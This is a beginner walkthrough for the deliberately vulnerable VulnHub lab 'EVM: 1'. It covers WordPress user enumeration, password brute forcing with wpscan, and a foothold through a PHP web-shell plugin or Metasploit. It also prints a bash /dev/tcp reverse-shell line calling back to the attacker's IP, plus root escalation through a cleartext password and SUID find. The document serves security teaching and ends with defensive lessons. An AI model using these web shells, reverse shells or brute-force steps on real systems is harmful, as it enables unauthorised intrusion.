# EVM: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | EVM: 1 |
| **Difficulty** | Easy |
| **Author** | Ic0de |
| **Released** | 2 Nov 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/evm-1,391/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/evm-1,391/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu — Apache + WordPress) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web reconnaissance** — spotting an HTML comment that leaks a hidden path.
- **WordPress enumeration** — using `wpscan` to enumerate users *and* brute-force a password.
- **Foothold via a legitimate admin feature** — uploading a malicious plugin as an admin.
- **Post-exploitation** — hunting for secrets left in a home directory.
- **Password-based privilege escalation** — finding a cleartext root password and using `su`.
- **(Alternate) Linux privesc** — checking for a SUID binary and abusing it via [GTFOBins](https://gtfobins.github.io/).

> **Why this matters:** this box is a compressed lesson in why *weak WordPress credentials* are so dangerous. Once you are an admin, WordPress, by design, lets you run code on the server.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x (Ubuntu)
53/tcp  open  domain      ISC BIND 9.x
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.x
|_http-title: Apache2 Ubuntu Default Page: It works
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** there are many open ports (mail, SMB, DNS) but the Apache default page on **port 80** is the most promising. The others may be decoys or need credentials; the web server is where beginners will find the way in. (Exact port lists vary slightly by build — always trust your own scan.)

![nmap service scan](images/02-nmap.png)

### 2.2 Web enumeration — the leaked path

Open `http://192.168.56.101`. You get the default Apache "It works!" page. **View the source** — there is a comment left by the author:

```bash
curl -s http://192.168.56.101/ | grep -i -A1 "find me"
```

```html
<!-- you can find me at /wordpress/ im vulnerable :) -->
```

> **Why it works:** developers leave comments in HTML all the time. They are invisible in the rendered page but plain to see with "view source" (Ctrl+U) or `curl`. This one literally tells us where to go next: **`/wordpress/`**.

![The Apache default page and its comment](images/03-web-comment.png)

Confirm the directory and enumerate it:

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/wordpress/ (CODE:301|SIZE:0)
```

Browse `http://192.168.56.101/wordpress/` — it is a WordPress site. Now use `wpscan` to enumerate **users**, **themes** and **plugins**:

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u,at,ap
```

```text
[+] URL: http://192.168.56.101/wordpress/ [192.168.56.101]
[+] WordPress version 5.x identified
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] c0rrupt3d_brain
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress exposes author information through `/?author=1` URLs and the REST API, and `wpscan` turns that into a user list. We now have a valid username: **`c0rrupt3d_brain`**. (Some builds also expose this name on the site itself.)

### 2.3 Brute-force the WordPress password

With a valid username, try a dictionary attack against the login. WordPress uses `rockyou.txt`-style passwords far too often.

```bash
wpscan --url http://192.168.56.101/wordpress/ \
  --password-attack wp-login \
  -U c0rrupt3d_brain \
  -P /usr/share/wordlists/rockyou.txt
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0rrupt3d_brain / 24992499
[+] Valid Combinations Found:
 | Username: c0rrupt3d_brain, Password: 24992499
```

> **Why it works:** WordPress login returns *different* responses for a bad username versus a bad password, which turns the form into a username oracle. Once the username is known, an offline wordlist (rockyou) quickly finds the weak password **`24992499`**.

> **Note:** `-P` (password file) was the old `wpscan` flag. On newer versions it is `--passwords` / `--password-attack`; use `wpscan --help` if a flag is rejected. The chain is the same.

![wpscan user enumeration and brute force](images/04-wpscan.png)

---

## 3. Foothold

### 3.1 Log in as WordPress administrator

Browse to `http://192.168.56.101/wordpress/wp-login.php` and log in:

- Username: `c0rrupt3d_brain`
- Password: `24992499`

`c0rrupt3d_brain` has **Administrator** rights. That is game over for a default WordPress install: admins can install plugins and edit theme files, both of which execute PHP on the server.

![WordPress admin login succeeds](images/05-wp-admin-login.png)

### 3.2 Get a reverse shell (two ways)

**Option A — automatic (Metasploit).** Metasploit ships a module that logs in and uploads a malicious plugin for you:

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set TARGETURI /wordpress
msf6 exploit(...) > set USERNAME c0rrupt3d_brain
msf6 exploit(...) > set PASSWORD 24992499
msf6 exploit(...) > set LHOST 192.168.56.10
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:53xxx)
```

> **Why it works:** the module authenticates as the admin, then uses WordPress's own **plugin upload** feature to place a PHP payload on disk and executes it. No software bug is needed — being an admin *is* the vulnerability. This is exactly the "file-upload / RCE plugin" risk you will hear about.

**Option B — manual (no Metasploit).** Write a tiny plugin that is a web shell, zip it, and upload it via **Plugins → Add New → Upload Plugin**:

```php
<?php
/*
Plugin Name: shell
*/
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
```

```bash
zip shell.zip shell.php
```

After activation, run commands through it:

```bash
curl "http://192.168.56.101/wordpress/wp-content/plugins/shell/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then swap `cmd=id` for a reverse-shell one-liner (e.g. `bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'`) after starting `nc -lvnp 4444` on Kali. Alternatively, as in other WordPress boxes, edit a theme PHP file under **Appearance → Editor** and load it via a 404 request.

> **Why it works:** both routes run attacker-controlled PHP as the web user (`www-data`). Upgrade the shell to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

![Reverse shell as www-data](images/06-shell.png)

---

## 4. Privilege escalation

### 4.1 Find the root password left on disk

Enumerate the home directories — always one of the first things to do after a shell.

```bash
cd /home
ls -la
cd root3r        # (some builds: /home/root3r)
ls -la
cat .root_password_ssh.txt
```

```text
willy26
```

> **Why it works:** a user on the box left the **root password in cleartext** inside a hidden file (`.` prefix means hidden; `ls -la` shows hidden files). This is a brutal but very common real-world finding — secrets stored in files on the system. `www-data` can read it because the file permissions allow it.

### 4.2 Switch to root

```bash
su root
# password: willy26
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the password we found *is* root's password. `su` switches user; with the correct password we land in a root shell. No exploit needed.

### 4.3 The root flag

```bash
cd /root
ls -la
cat /root/proof.txt
```

```text
<the root proof / flag for this box>
```

**Root flag captured.** The root proof lives in `/root/proof.txt` (the exact filename and contents are set by the released image — check `ls -la /root` and name the file you find; some builds use `flag.txt`).

![Cleartext root password and root shell](images/07-privesc.png)

### Alternate privesc path (varies by build)

Some builds of EVM also ship a **SUID `find`** binary, which gives root without needing the password:

```bash
find / -perm -4000 -type f 2>/dev/null | grep find
find . -exec /bin/sh -p \; -quit
```

> **Why it works:** a SUID-root `find` runs its `-exec` command as root. `-p` makes the shell preserve that privilege. See [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/). Whether this path exists depends on the build, so always run the SUID check yourself.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure via HTML comment | `http://<IP>/` source | Leaks the `/wordpress/` path |
| 2 | Username enumeration | WordPress REST/author routes | Reveals user `c0rrupt3d_brain` |
| 3 | Weak WordPress administrator password | `wp-login.php` | Full CMS admin access (`24992499`) |
| 4 | Server-side code execution by design | Plugin upload / theme editor | Reverse shell as `www-data` |
| 5 | Cleartext secret on disk | `/home/root3r/.root_password_ssh.txt` | Root password disclosed (`willy26`) |
| 6 | (Some builds) SUID root binary | `/usr/bin/find` | Local root shell via `-exec` |

---

## 6. Defensive lessons (blue team)

- **Remove developer comments** from production HTML. Review template output for comments that leak paths or internal notes.
- **Enforce strong admin credentials** and add rate limiting, lockouts and MFA to `wp-login.php`. Weak passwords like `24992499` fall instantly to `rockyou.txt`.
- **Return generic login errors** so attackers cannot tell a valid username from an invalid password.
- **Restrict who can install plugins / edit themes.** Set `define('DISALLOW_FILE_EDIT', true);` and `define('DISALLOW_FILE_MODS', true);` in `wp-config.php`, and grant the `install_plugins` capability only where absolutely required.
- **Never store secrets in files on disk**, especially not in cleartext, and never in world- or web-readable locations. Use a secret manager and restrict file permissions.
- **Never reuse or write down the root password.** Prefer `sudo` with per-command rules over sharing the root password.
- **Audit SUID/SGID binaries** regularly (`find / -perm -4000 -type f`) and cross-check against [GTFOBins](https://gtfobins.github.io/).
- **Keep WordPress core, themes and plugins patched**, and monitor file integrity of `wp-content/`.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- EVM: 1 on VulnHub — https://vulnhub.com/entry/evm-1,391/
- Hacking Articles — "EVM: 1 Vulnhub Walkthrough" — https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/
- FrostyLabs — "VulnHub: EVM-1" — https://frostylabs.net/posts/Vulnhub-evm1
- WPScan user documentation — https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
- Metasploit — `wp_admin_shell_upload` — https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
- GTFOBins — `find` — https://gtfobins.github.io/gtfobins/find/
- WordPress hardening — https://developer.wordpress.org/advanced-administration/security/hardening/

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan.
- [ ] `images/03-web-comment.png` — the Apache page and the `you can find me at /wordpress/` comment.
- [ ] `images/04-wpscan.png` — `wpscan` user enumeration and the `c0rrupt3d_brain : 24992499` brute force.
- [ ] `images/05-wp-admin-login.png` — successful WordPress administrator login.
- [ ] `images/06-shell.png` — the plugin upload / Metasploit shell as `www-data`.
- [ ] `images/07-privesc.png` — `.root_password_ssh.txt` (`willy26`), `su root`, and `/root/proof.txt`.
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: HTML comment → `/wordpress/` → `wpscan` user enum (`c0rrupt3d_brain`) → `wp-login` brute force (`24992499`) → admin plugin upload / Metasploit `wp_admin_shell_upload` → shell as `www-data` → `/home/root3r/.root_password_ssh.txt` (`willy26`) → `su root` → `/root/proof.txt`._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
